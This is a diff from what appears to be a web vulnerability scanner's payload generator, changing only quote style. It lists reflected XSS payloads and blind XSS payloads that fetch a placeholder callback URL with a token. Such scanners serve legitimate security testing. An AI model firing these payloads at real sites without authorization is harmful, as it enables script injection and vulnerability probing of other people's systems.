@@ -11,47 +11,47 @@ class PayloadGenerator:
         '"><svg/onload=alert(1)>',
         "')<script>alert(1)</script>",
         "'\"><script>alert(1)</script>",
-        '<img src=x onerror=alert(1)>',
-        '<svg onload=alert(1)>',
+        "<img src=x onerror=alert(1)>",
+        "<svg onload=alert(1)>",
         "javascript:alert(1)",
-        '<body onload=alert(1)>',
-        '<input onfocus=alert(1) autofocus>',
-        '<marquee onstart=alert(1)>',
-        '<details open ontoggle=alert(1)>',
+        "<body onload=alert(1)>",
+        "<input onfocus=alert(1) autofocus>",
+        "<marquee onstart=alert(1)>",
+        "<details open ontoggle=alert(1)>",
         # Event handler variations
-        '<iframe src=javascript:alert(1)>',
+        "<iframe src=javascript:alert(1)>",
         '<img src=/ onerror="alert(1)">',
-        '<img src=x onerror=\'alert(1)\'>',
+        "<img src=x onerror='alert(1)'>",
         # Protocol-based
         '<a href="javascript:alert(1)">click</a>',
         # DOM-based patterns
-        '${alert(1)}',
-        '{{alert(1)}}',
-        '<% alert(1) %>',
+        "${alert(1)}",
+        "{{alert(1)}}",
+        "<% alert(1) %>",
     ]
 
     # Blind XSS payloads - these will trigger callbacks to our collector
     BLIND_XSS_PAYLOADS = [
         # Basic blind XSS with image callback
-        '<img src=x onerror="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        "<img src=x onerror=\"fetch('https://yourdomain.com/xss/__TOKEN__')\">",
         # Script-based callback
         '<script>fetch("https://yourdomain.com/xss/__TOKEN__")</script>',
         # SVG onload callback
-        '<svg onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        "<svg onload=\"fetch('https://yourdomain.com/xss/__TOKEN__')\">",
         # Iframe callback
-        '<iframe src="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')"></iframe>',
+        "<iframe src=\"javascript:fetch('https://yourdomain.com/xss/__TOKEN__')\"></iframe>",
         # Form submission callback
         '<form action="https://yourdomain.com/xss/__TOKEN__" method="POST"><input type="submit"></form>',
         # Link click callback
-        '<a href="javascript:fetch(\'https://yourdomain.com/xss/__TOKEN__\')">click</a>',
+        "<a href=\"javascript:fetch('https://yourdomain.com/xss/__TOKEN__')\">click</a>",
         # Body onload callback
-        '<body onload="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        "<body onload=\"fetch('https://yourdomain.com/xss/__TOKEN__')\">",
         # Input focus callback
-        '<input onfocus="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" autofocus>',
+        "<input onfocus=\"fetch('https://yourdomain.com/xss/__TOKEN__')\" autofocus>",
         # Details toggle callback
-        '<details ontoggle="fetch(\'https://yourdomain.com/xss/__TOKEN__\')" open>',
+        "<details ontoggle=\"fetch('https://yourdomain.com/xss/__TOKEN__')\" open>",
         # Marquee start callback
-        '<marquee onstart="fetch(\'https://yourdomain.com/xss/__TOKEN__\')">',
+        "<marquee onstart=\"fetch('https://yourdomain.com/xss/__TOKEN__')\">",
     ]
 
     # SQLi payloads - basic detection only
